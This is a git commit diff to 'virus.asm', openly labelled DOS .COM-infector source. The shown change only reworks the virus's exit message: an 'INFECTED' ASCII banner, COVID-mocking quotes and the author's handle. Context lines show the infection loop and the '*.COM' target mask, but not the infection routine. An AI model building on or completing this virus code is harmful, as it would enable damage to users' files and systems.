a5b079b575c512f4beeeafbcd17a74ae796effa3
ArTic/JhoPro <69859148+ArTicZera@users.noreply.github.com>
2023-04-08 09:59:57 -0300

    Update virus.asm

--- virus.asm
+++ virus.asm
@@ -29,68 +29,29 @@ INFECT_LOOP:		jc EXIT_DOS ;jump to EXIT_DOS
 		jmp INFECT_LOOP ;jump to INFECT_LOOP
 		
 EXIT_DOS:
-
 		mov dx, offset TXT1 
 		mov ah, 09h
 		int 21h
-		mov dx, offset TXT2
-		mov ah, 09h
-		int 21h
-		mov dx, offset TXT3
-		mov ah, 09h
-		int 21h
-		mov dx, offset TXT4
-		mov ah, 09h
-		int 21h
-		mov dx, offset TXT5
-		mov ah, 09h
-		int 21h
-		mov dx, offset TXT6
-		mov ah, 09h
-		int 21h
-		mov dx, offset TXT7
-		mov ah, 09h
-		int 21h
-		mov dx, offset TXT8
-		mov ah, 09h
-		int 21h
-		mov dx, offset TXT9
-		mov ah, 09h
-		int 21h
-		mov dx, offset TXT95
-		mov ah, 09h
-		int 21h
-		mov dx, offset TXT10
-		mov ah, 09h
-		int 21h
-		mov dx, offset TXT11
-		mov ah, 09h
-		int 21h
-		mov dx, offset TXT12
-		mov ah, 09h
-		int 21h
-		mov dx, offset TXT13
-		mov ah, 09h
-		int 21h
+		
 		mov ax, 4C00h ;return to MS-DOS
 		int 21h
 		
 COM_FILE db '*.COM',0h 
 ;strings:
-TXT1 db "#####################################################",0dh,0ah,"$"
-TXT2 db "#  												 #",0dh,0ah,"$"
-TXT3 db "#  #  ##   #  ####  ####  ####  #####  ####  ###	 #",0dh,0ah,"$"
-TXT4 db "#  #  # #  #  #     #     #	   #	#     #  #   #",0dh,0ah,"$"
-TXT5 db "#  #  #  # #  ###   ###   #	   #	###   #   #  #",0dh,0ah,"$"
-TXT6 db "#  #  #   ##  #     #     #	   #    #     #  #   #",0dh,0ah,"$"
-TXT7 db "#  #  #    #  #     ####  ####    #	####  ###    #",0dh,0ah,"$"
-TXT8 db "#  												 #",0dh,0ah,"$"
-TXT9 db "#####################################################",0dh,0ah,"$"
-TXT95 db "----------------------------------------------------",0dh,0ah,"$"
-TXT10 db "'Ah e so uma gripezinha! Nao e nada de mais.'",0dh,0ah,"$"
-TXT11 db "'Ainda mais com meu historico de atleta.'",0dh,0ah,"$"
-TXT12 db "Virus by: ArTic/JhoPro",0dh,0ah,"$"
-TXT13 db "Discord: ArTic#1892",0dh,0ah,"$"
+TXT1 db "#####################################################",0dh,0ah,"$",
+	"#  						     #",0dh,0ah,"$",
+        "#  #  ##   #  ####  ####  ####  #####  ####  ###    #",0dh,0ah,"$",
+        "#  #  # #  #  #     #     #	   #	#     #  #   #",0dh,0ah,"$",
+        "#  #  #  # #  ###   ###   #	   #	###   #   #  #",0dh,0ah,"$",
+        "#  #  #   ##  #     #     #	   #    #     #  #   #",0dh,0ah,"$",
+        "#  #  #    #  #     ####  ####    #	####  ###    #",0dh,0ah,"$",
+        "#  						     #",0dh,0ah,"$",
+        "#####################################################",0dh,0ah,"$",
+        "----------------------------------------------------",0dh,0ah,"$",
+        "'Ah e so uma gripezinha! Nao e nada de mais.'",0dh,0ah,"$",
+        "'Ainda mais com meu historico de atleta.'",0dh,0ah,"$",
+        "Virus by: ArTic/JhoPro",0dh,0ah,"$",
+        "Discord: ArTic#1892",0dh,0ah,"$"
 
 ENDVIRUS:
 
